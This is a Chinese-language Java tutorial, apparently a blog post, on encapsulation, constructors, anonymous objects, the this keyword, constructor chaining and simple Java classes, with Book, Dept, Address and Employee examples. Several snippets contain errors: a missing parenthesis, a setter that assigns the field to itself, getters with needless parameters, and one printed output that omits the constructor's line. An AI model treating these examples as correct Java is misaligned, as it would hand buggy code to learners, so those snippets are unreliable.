<p>class Book<br>{<br>    private String title;<br>    private String author;<br>    private double price;<br>    public void setTitle(String t){<br>        title = t;<br>    }<br>    public void setAuthor(String a){<br>        author = a;<br>    }<br>    public void setPrice(double p)<br>    {<br>        price = p;<br>    }<br>    public String getTitle(){<br>        return title;<br>    }<br>    public String getAuthor(){<br>        return author;<br>    }<br>    public double getPrice()<br>    {<br>        return price;<br>    }</p>
<p>}<br>public class DongJun //主类<br>{<br>    public static void main(String avgs[]){<br>        Book book = new Book();<br>        book.setTitle(“我行得正”);<br>        book.setAuthor(“做的好”);<br>        book.setPrice(88);<br>        System.out.println(“图书名：”+book.getTitle()+book.getAuthor()+book.getPrice());<br>    }<br>}</p>
<blockquote>
</blockquote>
<p>图书名：我行得正做的好88.0</p>
<pre><code>在日后整个程序的开发过程之中，只要编写类中的属性一定要使用private进行声明，而private声明的属性必须要与之匹配的setter、getter方法才可以被外部所访问，即便当前的代码里面没有调用全部方法，但是作为一个标准类的功能这些方法都是必须提供出来的。</code></pre><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><pre><code>构造方法是Java类之中的一种特殊形式的操作方法，其调用的时机是在对象实例化的时候（堆内存开辟的时候进行调用），下面首先来观察一下构造方法的基本形式；</code></pre><p><strong>范例：观察构造方法</strong></p>
<pre><code>class Book
{
    public Book(){//构造方法
        System.out.println(&quot;******董俊来*******&quot;);
    }
}
public class DongJun
{
    public static void main(String args[])
    {
        System.out.println(&quot;【1】声明book类对象：“Book book = null; ”&quot;);
        Book book = null; 
        System.out.println(&quot;【2】实例化book类对象:“book = new Book();”&quot;);
        book = new Book();//实例化对象
    }
}</code></pre><blockquote>
<p>【1】声明book类对象：“Book book = null; ”<br>【2】实例化book类对象:“book = new Book();”</p>
</blockquote>
<p><strong>在整个程序执行过程之中，真正进行构造方法调用的位置处就是使用关键字“new”实例化对象的时候，实际上对于此时的操作，Book类中就定义了构造方法，但是对于构造方法本身是有其非常严格的定义要求的：</strong></p>
<pre><code>|- 构造方法的方法名称不能够任意编写，必须与类名称保持一致；
    - 此时定义的类是类名称是Book,而构造方法的名称使用的是“public Book(){}”;
|- 构造方法没有返回值声明，并且不能够返回任何的数据内容;
|- 一个类之中如果没有定义任何的构造方法，则会在程序编译的时候自动由JDK生成一个无参的构造方法。</code></pre><p><em>构造方法在现实中的应用；</em></p>
<pre><code>|- 构造方法是在使用关键字new的时候才会被调用，而且一个对象只会执行一次构造操作，就好比一个人只能出生一次;
|- 如果现在类中没有通过构造方法进行属性内容的设置，那么就意味着整个的程序在对象实例化之后所有的成员属性都是默认值，那么就需要一步一步的进行属性的配置，就好比书先封装好了，随后再往里面填充内容，最终形成成品。</code></pre><blockquote>
<p>　　<strong>如果现在一个类种即要求有参构造也要求提供无参构造的时候后，唯一可以使用的方法就是通过方法的重载形式来完成，但是需要注意的是，此时只需要考虑方法的参数类型及个数即可（因为构造方法的名称和类名称是完全相同的）</strong></p>
</blockquote>
<p><strong>观察方法的重载</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(){}
    public Book(String t){
        this.setTitle(t);
        this.setAuthor(&quot;沐言优拓&quot;);
        this.setPrice(90.1);
    }
    public Book(String t, String a, double p)
    {
        setTitle(t);
        this.setAuthor(a);
        setPrice(p);
    }
    public void getInfo(){
        System.out.println(&quot;图书标题：&quot;+ title + &quot;\n图书作者：&quot;+ author +&quot;\n图书价格：&quot;+ price);
    }
    public void setTitle(String t){
        title = t;
    }
    public void setAuthor(String a){
        author = a;
    }
    public void setPrice(double p){
        price = p;
    }

}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;董俊&quot;,&quot;2&quot;,89.0);
        book.getInfo();
    }
}</code></pre><p><strong>本程序在Book类中定义有三个构造方法：无参构造、单参构造以及三参构造，需要注意的是构造方法本身没有明确的顺序要求，但是考虑到代码的结构性的特点，按照采用参数的降序排列或者升序排列</strong></p>
<p><strong>类中构造方法和类中的普通方法的定义有什么区?</strong></p>
<blockquote>
<p>*　　类的构造方法只在使用关键字new实例化新对象的时候调用一次，而有了实例化对象之后，就可以利用该对象重复的调用类中定义的普通方法。*</p>
<ul>
<li>如果现在构造方法不返回任何数据，那么为什么不能够使用void定义呢？<br>构造方法的名称是由大小写要求的，但是如果仅仅是凭借名称实际上编译器是无法区别构造方法还是普通方法。</li>
</ul>
</blockquote>
<pre><code>如果从方法定义的角度来讲，JDK是依据结构来区分构造或是普通方法的，如果加上了void，实际上就变为了普通方法。</code></pre><h2 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h2><pre><code>匿名本质上的含义指的就是没有名字，而匿名对象本质上的核心思想就是没有名字的对象。</code></pre><p><em>范例：观察匿名对象的使用</em></p>
<pre><code>class Book {
    private String title;
    private String author;
    private double price;
    public Book(){};    //无参构造方法
    public Book(String t){     //单参构造方法
        this.setTitle(t);
        this.setAuthor(&quot;沐言优拓&quot;);
        this.setPrice(-1.0);
        }
    public Book(String t, String a, double p){
        setTitle(t);
        this.setAuthor(a);
        setPrice(p);
    }
    public void getInfo() {
        System.out.println(&quot;图书名称：&quot;+title+&quot;、图书作者：&quot;+ author + &quot;、图书价格：&quot;+ price);
    }
    public void setTitle(String t){
        title = t;
    }
    public void setAuthor(String a){
        author = a;
    }
    public void setPrice(double p) {
        if (p &gt; 0)
        {
            price = p;
        }
    }
    public String getTitle(){
        return title;
    }
    public String getAuthor(){
        return author;
    }
    public double getPrice(){
        return price;
    }
}
public class YootkDemo{
    public static void main(String args[]){
         new Book(&quot;从入门到时间&quot;,&quot;董俊&quot;,99).getInfo(); // 声明并实例化
         new Book(&quot;从入门到时间&quot;).getInfo();
         new Book().getInfo();
    }
}</code></pre><blockquote>
<p><strong>此时通过关键字new创建的book类的实例化对象，那么就属于一个匿名对象，因为没有对象名称对其进行引用（之前分析了：通过对象名称可以让对象调用多次的操作，如果没有对象名称了，那么该对象就没有引用了，这个对象在使用一次之后就会成为垃圾对象了，那么这个时候有同学可能就不理解了，为什么要有匿名对象呢？）</strong><br><em>现在假设有这样一种生活场景：我是一个卖视频的商铺，因为我的生意非常的火爆，所以我没有时间为我制作的每一件商品命名</em></p>
</blockquote>
<p><strong>范例：使用匿名对象</strong></p>
<pre><code>class Food
{
    private String name;
    private double price;
    public Food(String n, double p){
        name = n;
        price = p;
    }
        //setter、getter略
        public String getInfo(){
            return &quot;名称：&quot;+name + &quot;、价格：&quot; +price;    
        }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        for (int x= 0;x &lt;100  ; x ++ )
        {
            sale(new Food(&quot;西红柿烤烧饼&quot;,7.9);
        }
    }
    public static void sale(Food temp){
        System.out.println(&quot;【卖出商品】&quot;+ temp.getInfo());
    }
}</code></pre><blockquote>
<p><strong>当然，以上的代码也可以使用有名对象，例如：先为food实例化对象命名，随后在通过对象名称进行操作</strong></p>
</blockquote>
<p>​    </p>
<h2 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h2><pre><code>如果要是以java中的关键字使用为例，个人觉得this关键字是比较繁琐的一个关键字，因为this在程序开发之中使用较为灵活，它可以根据不同的环境而有所改变，而且使用this关键字进行处理操作的过程之中，可以描述是那种处理含义：成员属性、方法（普通方法、构造方法）、表示当前对象。</code></pre><h3 id="this-调用本类成员属性"><a href="#this-调用本类成员属性" class="headerlink" title="this 调用本类成员属性"></a>this 调用本类成员属性</h3><pre><code>在一个类中定义的许多的成员属性都可以互相进行调用，例如：某一个属性可能在构造方法中被调用，那么也可能在普通方法中进行调用，只要是在一个类中那么就都可以实现这样的处理。</code></pre><p><em>范例：观察之前编写过的一个代码</em></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(String t, String a, double p ){
        title = t;
        author = a ;
        price = p ;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(book.getInfo());
    }
}</code></pre><blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0</p>
</blockquote>
<pre><code>以上的程序代码是在之前经常编写过的程序逻辑，但是对于当前的程序代码里面有一处的设计是非常不合理的，这一处指的就是类中定义的构造方法，来观察一下构造方法的定义：
|- 
    public Book(String t, String a, double p ){
    title = t;
    author = a ;
    price = p ;
    }
这个时候的构造方法里面需要传递有三个参数，并且这三个参数名称使用了单个字母描述，那么请问，如果按照正常的标识符的定义要求来讲，这样的标识符虽然符合语法意义，但是不符合于实际的“明确要求”，因为字母t、a、p可能描述的单词范围太多了，那么这个时候最佳的做法肯定是希望可以写上全部的名称</code></pre><p><em>范例：修改程序实现正确的赋值</em></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(String title, String author, double price ){
        //一旦使用了“this.属性”，那么就永恒描述的是类中的成员耐属性。
        this.title = title;
        this.author = author ;
        this.price = price ;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(book.getInfo());
    }
}</code></pre><blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0</p>
</blockquote>
<pre><code>在以后编写代码的过程之中，只要是访问本类中的成员属性的操作里面一定要采用“this.属性”的形式进行明确的指派，我曾经个人在编写代码的时候就因为有一个地方少写了 this，最终发现执行的结果缺少内容 ，我排查了好久之后才发现的问题。</code></pre><h3 id="调用本类的普通方法"><a href="#调用本类的普通方法" class="headerlink" title="调用本类的普通方法"></a>调用本类的普通方法</h3><pre><code>在一个类之中往往会存在有大量的普通方法，这些普通方法每当获取了该类的实例化对象之后，那么都可以直接进行调用，而如果要在本类中进行方法调用的时候，理论上直接使用方法名称即可，但是也可以使用&quot;this.方法()&quot;的形式进行更加明确的调用（两者效果相同，但是后者的编写形式更好）。</code></pre><p><strong>范例：观察本类的方法调用</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book() {}
    public Book(String title, String author, double price ){
        setTitle(title);
        setAuthor(author);
        setPrice(price); //调用本类方法
    }
    public void set(String title, String author, double price) {
        setTitle(title);
        setAuthor(author);
        setPrice(price); //调用本类方法
    }
    public void setTitle(String title) {
        this.title =  title;
    }
    public void setAuthor(String author){
        this.author = author;
    }
    public void setPrice(double price){
        this.price = price ;
    }
    public String getTitle() {
        return this.title;
    }
    public String getAuthor() {
        return this.author;
    }
    public double getPrice() {
        return this.price;
    }
    public String getInfo(){
        return &quot;【图书信息】书名：&quot;+this.title + &quot;、作者：&quot;+ this.author + &quot;、价格：&quot;+ this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book bookA = new Book(&quot;入门到实战&quot;,&quot;董俊&quot;,90);
        System.out.println(bookA.getInfo());
        Book bookB = new Book();
        bookB.set(&quot;Python从入门到实战&quot;,&quot;李兴华&quot;,98.8);
        System.out.println(bookB.getInfo());
    }
}</code></pre><blockquote>
</blockquote>
<p>【图书信息】书名：入门到实战、作者：董俊、价格：90.0<br>【图书信息】书名：Python从入门到实战、作者：李兴华、价格：98.8</p>
<pre><code>按照正常的设计思维来讲，类之中的普通方法调用的形式应该为“对象.方法()”，但是如果要是在本类之中调用本类的方法时候可以直接编写方法名称，而如果要想更加明确的描述调用本类方法的话则最好编写的形式为&quot;this.方法()&quot;</code></pre><h2 id="构造方法互调用"><a href="#构造方法互调用" class="headerlink" title="构造方法互调用"></a>构造方法互调用</h2><pre><code>|- 一个类之中构造方法是允许进行重载的，在进行构造方法重载的过程之中只需要考虑方法的参数类型及个数的不同即可，所以一个类里面构造方法可能有很多，那么在这样的环境下就可以考虑利用&quot;this()&quot;的形式实现构造方法的互相调用，这种互相调用的机制也仅仅是使用一次(构造方法只能够调用一次，是在新对象开辟堆内存空间的时候使用)。
|- 既然所有的对象进行实例化的时候都一定会进行构造方法的调用，那么假设说现在类中存在有三个构造方法，分别描述的是无参构造、单参构造、三参构造，那么这个时候不管是调用了那一个构造方法，都可能执行某些操作（输出一些重要的信息），那么按照原始的做法代码有可能定义为如下的形式：</code></pre><p><strong>范例：采用原始的形式实现固定操作的执行</strong></p>
<pre><code>class Book
{
    public Book() { 
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
        }
    public Book(String title) {//单参
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
    public Book(String title, String author, double price ){//多参
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>此时的程序已经实现了之前提出的开发要求，只要是进行新对象的创建，则一定要进行提示信息的输出，但是这个时候也可以发现一个问题：对于某些操作重复的在代码中出现了，按照之前所讲解的形式，如果要想解决重复，那么一般可以考虑使用方法进行包装，那么只需要每一次调用特定的方法就可以解决重复代码定义问题。</code></pre><p><em>范例：利用方法的形式解决代码重复</em></p>
<pre><code>class Book
{
    public Book() { 
        this.initObject();
        }
    public Book(String title) {//单参
        this.initObject();
    }
    public Book(String title, String author, double price ){//多参
        this.initObject();
    }
    public void initObject() { // 信息提示
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>虽然这个时候进行了重复代码的方法定义，并且在构造方法之中通过&quot;this.initObject()&quot;方法执行了重复的代码，但是你也会发现此时的程序代码中也存在有设计问题，会发现不同的构造方法里面调用了同样的方法，实际上这个时候后又是一种重复，那么为了解决当前的这种重复的设计，最佳的做法是直接进行构造方法的互调用</code></pre><p><strong>范例：利用this实现构造方法的互调用</strong></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
        System.out.println(&quot;【对象创建提示】&quot;);//想象为30行代码
        }
    public Book(String title) {//单参
        this();
        this.title = title;
    }
    public Book(String title, String author, double price ){//多参
        this(title);//调用无参构造
        this.title = title;
        this.author = author;
        this.price = price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            new Book(&quot;java实战&quot;,&quot;董俊&quot;,89);
            new Book(&quot;java实战&quot;);
            new Book();
        }
}</code></pre><blockquote>
</blockquote>
<p>【对象创建提示】<br>【对象创建提示】<br>【对象创建提示】</p>
<pre><code>此时利用了&quot;this()&quot;的语法形式实现了类中不用构造方法的互相调用，并且通过具体的操作实现也可以发现，这种结构的确是比方法抽象更加节约对象初始化代码的效果，但是对于当前的这种语法也需要考虑如下几个问题：
|- 使用&quot;this()&quot;调用构造方法处理的时候必须放在构造方法的首行，因为构造方法是在类对象实例化的时候首先调用的，所以其必须放在构造内，而不同的构造方法有可能存在有不同的顺序问题，所以才将其放在首行。
|- 使用构造方法互相调用的时候一定要保留有出口，否则在程序编译的时候就会直接出现递归错误信息，所以这样程序代码在编译的时候就会直接报错。

既然已经清楚了构造方法之间的互相调用，那么下面就可以针对于这种互相调用进行一次实际的应用说明，现在假设说有一个Book类（包含有三个成员属性&quot;title&quot;、“author”、“price”），这个类中会提供有三种构造方法
    — 无参构造：要求图书名称为“木言优拓”，作者为“李兴华”,价格为9988.66;
    — 单参构造：要求接受图书名称，但是默认情况下的作者为“小李老师”,几个5566.88;
    — 三参构造：要求接受全部的三个成员属性的内容。</code></pre><p><strong>先不去考虑重用性设计直接编写原始代码</strong></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
            this.title = &quot;木言优拓&quot;;
            this.author = &quot;李兴华&quot;;
            this.price = 9988.66;
        }
    public Book(String title) {//单参
            this.title = title;
            this.author = &quot;小李老师&quot;;
            this.price = 5566.88;
        }

    public Book(String title, String author, double price ){//多参
            this.title = title;
            this.author = author;
            this.price = price;

    }
    public String getInfo(){
        return &quot;图书名称:&quot; + this.title + &quot;、图书作者：&quot;+ this.author + &quot;、图书价格:&quot; +this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            Book bookB = new Book(&quot;从java到入门&quot;);
            Book bookC = new Book(&quot;从python到入门&quot;,&quot;李兴华&quot;,99.8);
            System.out.println(bookA.getInfo());
            System.out.println(bookB.getInfo());
            System.out.println(bookC.getInfo());
        }
}</code></pre><blockquote>
</blockquote>
<p>图书名称:木言优拓、图书作者：李兴华、图书价格:9988.66<br>图书名称:从java到入门、图书作者：小李老师、图书价格:5566.88<br>图书名称:从python到入门、图书作者：李兴华、图书价格:99.8</p>
<pre><code>此时程序已经完成了既定的开发要求，但是也可以明确的发现所有重复的操作代码，那么在这样的情况下就可以考虑利用构造方法的互调用来解决当前的重复操作问题。</code></pre><p><em>解决构造方法中的重复代码</em></p>
<pre><code>class Book
{
    private String title;
    private String author; 
    private double price;
    public Book() { 
            this(&quot;木言优拓&quot;,&quot;李兴华&quot;,9988.66);
        }
    public Book(String title) {//单参
            this(title,&quot;小李老师&quot;,5566.88);
        }

    public Book(String title, String author, double price ){//多参
            this.title = title;
            this.author = author;
            this.price = price;

    }
    public String getInfo(){
        return &quot;图书名称:&quot; + this.title + &quot;、图书作者：&quot;+ this.author + &quot;、图书价格:&quot; +this.price;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            Book bookB = new Book(&quot;从java到入门&quot;);
            Book bookC = new Book(&quot;从python到入门&quot;,&quot;李兴华&quot;,99.8);
            System.out.println(bookA.getInfo());
            System.out.println(bookB.getInfo());
            System.out.println(bookC.getInfo());
        }
}</code></pre><blockquote>
</blockquote>
<p>图书名称:木言优拓、图书作者：李兴华、图书价格:9988.66<br>图书名称:从java到入门、图书作者：小李老师、图书价格:5566.88<br>图书名称:从python到入门、图书作者：李兴华、图书价格:99.8</p>
<pre><code>构造方法的主要作用是进行成员初始化操作，但是在成员属性初始化的过程之中难免会存在有重复的初始化的操作代码，所以这个时候利用构造方法来解决是最合理的一种做法。</code></pre><h2 id="this-表示当前对象"><a href="#this-表示当前对象" class="headerlink" title="this 表示当前对象"></a>this 表示当前对象</h2><pre><code>经过了之前一系列分析可以发现，对于this有一个最为常见的调用类结构的操作形式：“this.成员属性”、“this.方法()”，那么根据在之前所学习的概念来讲，类中的属性或方法可以调用的只能够是实例化对象（如果使用了没有实例化的对象，则一定会出现“NullPointerException”），所以之前的语法之中的this本质上描述的就是一个对象，但是这个对象不是一个固定的对象，而是描述的当前对象概念。
    一般的拥有浪漫气息的节日里面，酒店或者一些客房的预订最为繁华的，例如：红色情人节需要准备，如果是白色情人节也可以准备，如果是浪漫的圣诞结更需要准备。</code></pre><p><strong>如果要想观察出程序里面的当前对象，最简单的做法就是直接进行this关键字的输出，默认情况下每一个实例化对象的输出应该得到的就是一个对象的编码</strong></p>
<p><em>观察实例化对象的直接输出</em></p>
<pre><code>class Book{}
public class DongJun //主类
{
    public static void main(String avgs[]){
            Book bookA = new Book();
            System.out.println(&quot;【main()方法】 = &quot; + bookA);
            Book bookB = new Book();
            System.out.println(&quot;【main()方法】 = &quot; + bookB);
    }
}</code></pre><blockquote>
</blockquote>
<p>【main()方法】 = Book@63961c42<br>【main()方法】 = Book@65b54208</p>
<pre><code>Java中的类属于引用数据类型，引用数据类型之中需要去考虑堆栈的引用关系,发现如果直接进行对象的输出所获得的就是一个对象的编码，而这种编码的格式为“类名称@编码”（这个是由Java内部默认决定的程序结构）。</code></pre><p><strong>范例：观察this与对象的关联</strong></p>
<p>class Book{<br>    public void print() {<br>        System.out.println(“【Book类-print()方法】”+this);<br>    }<br>}<br>public class DongJun //主类<br>{<br>    public static void main(String avgs[]){<br>            Book bookA = new Book();<br>            System.out.println(“【main()方法】 = “ + bookA);<br>            bookA.print();<br>            System.out.println(“—————-   防止   —————- “);<br>            Book bookB = new Book();<br>            System.out.println(“【main()方法】 = “ + bookB);<br>            bookB.print();<br>    }<br>}</p>
<blockquote>
</blockquote>
<p>【main()方法】 = Book@63961c42<br>【Book类-print()方法】Book@63961c42<br>—————-   防止   —————-<br>【main()方法】 = Book@65b54208<br>【Book类-print()方法】Book@65b54208</p>
<p><strong>范例：使用this实现引用传递</strong></p>
<pre><code>class Message 
{
    private String title;
    private String content;
    private Channel channel;
    public Message(Channel channel, String title, String content){
        this.title = title;
        this.content= content;
        this.channel = channel;
    }
    public void send() {
        if (this.channel.connect())
        {
            System.out.println(&quot;【Message】消息发送，消息标题：&quot;+ this.title + &quot;、消息内容：&quot; + this.content);
            this.channel.close();
        } else {
            System.out.println(&quot;【Message】没有可用的消息发送通道，消息发送失败&quot;);
        }
    }
}
class Channel
{
    private Message message;
    public Channel(String title, String content){
        this.message = new Message(this, title, content);
        this.message.send();
    }
    public boolean connect() {
        System.out.println(&quot;【Channel】建立消息信息的发送通道&quot;);
        return true;
    }
    public void close() {
        System.out.println(&quot;【Channel】关闭消息信息的发送通道&quot;);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Channel channel = new Channel(&quot;木言优拓在线教育&quot;,&quot;编程训练营&quot;);
    }
}</code></pre><blockquote>
</blockquote>
<p>【Channel】建立消息信息的发送通道<br>【Message】消息发送，消息标题：木言优拓在线教育、消息内容：编程训练营<br>【Channel】关闭消息信息的发送通道</p>
<pre><code>现在是在Channel类里面实例化了Message类的独享，所以这个时候如果直接出现有&quot;this&quot;，那么所描述的就是当前channel的对象。</code></pre><h2 id="简单Java类"><a href="#简单Java类" class="headerlink" title="简单Java类"></a>简单Java类</h2><pre><code>在整个的Java技术学习过程之中，首先一定要明确一个核心的问题：学习一门语言如果要想尽快的上手开发，那么就必须熟练的掌握一些核心的编程模型（数学公式），只要遇见了相似的程序按照公式的形式直接定义好即可。
本次重点来研究关于简单Java类的定义，实际上从项目的开发角度来讲，使用类有一个最为核心的功能，它能够描述有一类群体的共性特征。
简单Java类指的是一个类之中主要由属性以及setter、getter方法所组成的类，这个类不牵扯到各种复杂的运算逻辑，仅仅是进行相关数据的存储，同时这种类一般都有明确的实物类型，例如：定义一个描述部门的信息类、定义一个描述雇员的信息类、定义一个描述教师的程序类。
在Java里面随着技术学习的不断深入，你会慢慢更加深刻的了解简单java类的实际使用，包括一些设计上的不断的改良，但是对于现在来讲，给出如下的简单java类的开发要求：
|- 【必选】类名称一定要有意义，可以明确的描述某一类的事物特征；
|- 【必选】类之中所有的属性都必须使用private封装;
|- 【必选】如果要进行属性点设置或者是修改则一定要通过setter方法完成，而属性的获取要通过getter;
|- 【必选】类之中可以定义若干个构造方法，但是一定要提供有一个无参构造方法（需要通过反射机制研究）;
|- 【必选】对象中的所有信息不允许直接在类中使用&quot;System.out.println()&quot;输出,所有的输出内容一定要返回给被调用处来进行输出处理
|- 【可选】类中要提供有一个返回对象信息的处理方式;</code></pre><p><strong>范例定义一个描述部门信息的简单java类</strong></p>
<blockquote>
</blockquote>
<pre><code>|- 假设现在部门信息里面需要包含有部门编号、名称以及位置三个核心属性。

class Dept
{
    private long deptno ; 
    private String dname;
    private String loc;
    public Dept(){}
    public Dept(long deptno, String dname, String loc ){
        this.deptno=deptno;
        this.dname= dname;
        this.loc = loc ;
    }
    public void setDeptno(long deptno){
        this.deptno=deptno;
    }
    public void setDname(String dname){
        this.dname = dname;
    }
    public void setLoc(String loc){
        this.loc = loc ;
    }
    public long getDeptno()
    {
        return this.deptno;
    }
    public String getDname(){
        return this.dname;
    }
    public String getLoc(){
        return this.loc;
    }
    public String getInfo() {
        return &quot;【部门】部门编号：&quot; + this.deptno + &quot;、部门名称：&quot; + this.dname  + &quot;、部门位置：&quot; + this.loc;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Dept dept = new Dept(10, &quot;沐言有哦&quot; , &quot;北京&quot;);
        System.out.println(dept.getInfo());
    }
}</code></pre><blockquote>
</blockquote>
<p>【部门】部门编号：10、部门名称：沐言有哦、部门位置：北京</p>
<pre><code>对于此时的Dept类功能非常的单一，就是进行了数据的保存以及数据的获取，所以这个类不涉及到任何的运算逻辑，就被开发中称为简单java类。</code></pre><blockquote>
<pre><code>重要提示：简单java类是最基础的模型，但是其可以考察以及覆盖的知识点是非常全面的
    |- 类的基本组成：属性、方法（构造方法、普通方法）；
    |- 数据类型的选择：基本类型、引用类型（后面会有更加深入的分析）;
    |- 构造方法的重载；
    |- 属性的封装有以及setter、getter方法的定义要求；
    |- 字符串的连接操作。</code></pre></blockquote>
<h2 id="类与对象实例分析"><a href="#类与对象实例分析" class="headerlink" title="类与对象实例分析"></a>类与对象实例分析</h2><pre><code>面向对象是所有初学者学习的难点，实际上在我个人学习的过程之中，对于面向对象想起来都觉得头大，因为其所涉及的概念是非常的多的，有其实很多的同学学到现在的时候就会突然发懵：不知道什么时简单java类，什么又不是简单java类，针对于这样的情况，本次为大家分析三道程序案例。</code></pre><h3 id="地址类"><a href="#地址类" class="headerlink" title="地址类"></a>地址类</h3><blockquote>
<p><strong>问题一：编写并测试一个代表地址的Address类，地址信息由国家、省份、城市、街道、邮编组成，并可以返回完整地址信息。</strong></p>
</blockquote>
<pre><code>对于此时的设计开发要求本身并没有过多的繁琐，因为在之前所编写的图书类、部门类等等都与该类的结构非常的相似，所以这种类严格来讲就属于一个简单java类

class Address 
{
    // 属性private封装
    private String country;
    private String province;
    private String city;
    private String street;
    private String zipcode;
    public Address(){}
    public Address(String country, String province, String city, String street, String zipcode)
    {
        this.country = country;
        this.province = province;
        this.city = city;
        this.street = street;
        this.zipcode = zipcode;
    }
    public String getInfo(){
        return &quot;【Address】国家：&quot;+ this.country +&quot;、省份：&quot; + this.province + &quot;、城市：&quot; + this.city + &quot;、街道:&quot;+ this.street + &quot;、邮编:&quot;+ this.zipcode;
    }
    public void setCountry(String country){
         this.country = country;
    }
    public void setProvince(String province){
        this.province = province;
    }
    public void setCity(String city){
        this.city = city;
    }
    public void setStreet(String street){
        this.street = street;
    }
    public void setZipcode(String Zipcode){
        this.zipcode = zipcode;
    }
    public String getCountry(String country){
        return this.country;
    }
    public String getProvince(String province){
        return this.province;
    }
    public String getCity(String city){
        return this.city;
    }
    public String getStreet(String street){
        return this.street;
    }
    public String getZipcode(String zipcode){
        return this.zipcode;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Address addr = new Address(&quot;中国&quot;,&quot;湖北&quot;,&quot;武汉&quot;,&quot;新洲区&quot;,&quot;00000&quot;);
        System.out.println(addr.getInfo());
    }
}</code></pre><blockquote>
<p>【Address】国家：中国、省份：湖北、城市：武汉、街道:新洲区、邮编:00000</p>
</blockquote>
<pre><code>对于这样的程序开发啊，其本身属于简单java类，如果连这样的基本程序都不能够保证一次性写对（可以快速的修改正确），那么就不建议你使用任何的开发工具进行代码编写</code></pre><h3 id="员工信息类"><a href="#员工信息类" class="headerlink" title="员工信息类"></a>员工信息类</h3><p><strong>定义并测试一个代表员工的Employee类。员工属性包括“编号”、“姓名”、“基本薪水”、“薪水增长率”，还包括计算薪水增长额及计算增长后的工资总额的操作方法。同时在该类中要提供有四个构造方法：</strong><br><em>【无参构造】编号定义为1000，姓名定义为无名氏，其他内容均为默认值；</em><br><em>【单参构造】传递编号，姓名定义为“新员工”，基本薪水为3000.00,薪水增长率为1%；</em><br><em>【三参构造】传递编号、姓名、基本工资、薪水增长率为5%；</em><br><em>【四参构造】所有的属性全部进行传递。</em></p>
<blockquote>
</blockquote>
<p><strong>题目分析：这个程序并不能算是一个完全的简单java类，因为这个类里面包含有一部分的业务处理逻辑（逻辑计算），但是其整体操作结构依然是进行数据的存储。</strong></p>
<p><em>范例：定义并使用员工类</em></p>
<pre><code>class Employee
{
    private long empno ;
    private String ename ;
    private double salary;
    private double rate;
    // setter、getter操作略…… ， 实际代码之中一定要写上这些方法
    public Employee() {
        this(1000, &quot;无名氏&quot;,0.0, 0.0);
    }
    public Employee(long empno) {
        this(empno, &quot;新员工&quot;,3000.00,0.01);

    }
    public Employee(long empno, String ename , double salary ){
        this(empno, ename, salary, 0.05);
    }
    public Employee(long empno, String ename, double salary, double rate){
        this.empno = empno;
        this.ename = ename;
        this.salary = salary;
        this.rate = rate;
    }
    public double salaryIncValue(){
        this.salary  = this.salary * (1 + this.rate) ;
        return this.salary ;
    }
    public String getInfo(){
        return &quot;【Employee】员工编号:&quot;+ this.empno + &quot;、员工姓名:&quot;+ this.ename + &quot;、基本工资:&quot;+ this.salary + &quot;、增长额:&quot; + this.rate;
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Employee emp = new Employee(9527,&quot;周星星&quot;,5000.0,0.1);
        System.out.println(emp.getInfo());
        System.out.println(&quot;工资增长：&quot;+emp.salaryIncValue());

    }
}</code></pre><blockquote>
<p>【Employee】员工编号:9527、员工姓名:周星星、基本工资:5000.0、增长额:0.1<br>工资增长：5500.0</p>
</blockquote>
